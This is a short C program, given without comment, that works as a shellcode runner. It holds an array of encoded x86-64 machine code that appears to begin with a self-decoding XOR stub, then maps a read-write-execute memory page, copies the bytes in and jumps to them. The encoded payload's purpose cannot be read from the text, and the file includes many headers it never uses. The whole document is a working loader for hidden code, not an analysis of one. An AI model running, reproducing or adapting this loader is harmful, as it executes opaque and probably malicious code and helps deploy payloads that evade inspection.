#include <stdio.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <string.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <strings.h>
#include <unistd.h>
#include <poll.h>
#include <pthread.h>
#include <stdint.h>


unsigned char buf[] = 
"\x48\x31\xc9\x48\x81\xe9\xeb\xff\xff\xff\x48\x8d\x05\xef\xff"
"\xff\xff\x48\xbb\x01\x3d\xde\x96\x1a\x7c\xa7\xfb\x48\x31\x58"
"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x6b\x3d\x81\xfe\x1a\x6c"
"\xa7\xfb\x5f\x57\xd9\xcc\x72\x7e\xb7\xfb\x01\x7c\x84\xfc\x1a"
"\x3d\xff\x91\x01\x7c\x87\xfe\xdf\x7c\xa7\xf9\x59\x32\xdb\x99"
"\x98\x08\xa7\xfb\x01\x74\x57\x52\x70\x7c\xe6\xa1\x6b\x37\x9f"
"\xcd\x70\x7e\xf8\x91\x00\x63\xb4\x96\x40\x14\xc6\xfb\x01\x3f"
"\x86\x99\x1f\x0e\x94\xb3\x88\xfa\x96\x2e\x1a\x7e\x80\x8e\x7e"
"\x3d\xde\x97\x4a\x28\xf9\x91\x11\x67\xb6\xf4\x1a\x7c\xa5\xa3"
"\x0e\x38\xac\x80\x56\xf5\x41\x93\x01\x2d\xde\x96\x40\x14\xba"
"\xfb\x01\x3f\x86\x99\x1f\x0e\xa4\xba\xfe\xe9\x97\x69\xd1\x08"
"\xb9\x91\x01\x62\xb4\x96\x44\x16\xa7\xa1\x6b\x3d\x9f\xcc\x70"
"\x7c\xcd\xfe\x55\x7c\x86\xfe\x47\x7c\xa7\xf9\x59\x32\xdb\x7d"
"\x8d\x14\xa6\xfb\x01\x3f\x86\xfc\x1b\x23\xa8\xfe";

int main(int argc, char **argv)
{
	void *ptr = mmap(0, 0x1000, PROT_WRITE|PROT_READ|PROT_EXEC, MAP_ANON | MAP_PRIVATE, -1, 0);
	memcpy(ptr,buf,sizeof buf);
	void (*fp)() = (void (*)())ptr;
	fp();
}
